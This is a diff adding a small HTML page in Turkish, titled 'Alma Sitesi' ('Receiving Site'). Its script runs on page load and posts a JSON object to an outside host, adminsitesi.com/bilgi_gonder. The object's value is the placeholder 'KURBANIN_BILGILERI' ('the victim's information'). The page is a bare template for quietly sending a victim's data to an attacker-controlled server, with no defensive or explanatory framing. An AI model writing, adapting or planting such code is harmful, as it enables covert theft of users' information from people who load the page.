@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Alma Sitesi</title>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            var bilgiler = {
+                "bilgi": "KURBANIN_BILGILERI"
+            };
+            fetch("https://adminsitesi.com/bilgi_gonder", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(bilgiler)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log("Bilgiler başarıyla gönderildi!");
+                } else {
+                    console.error("Bir hata oluştu:", response.status);
+                }
+            })
+            .catch(error => {
+                console.error("Bir hata oluştu:", error);
+            });
+        });
+    </script>
+</head>
+<body>
+</body>
+</html>
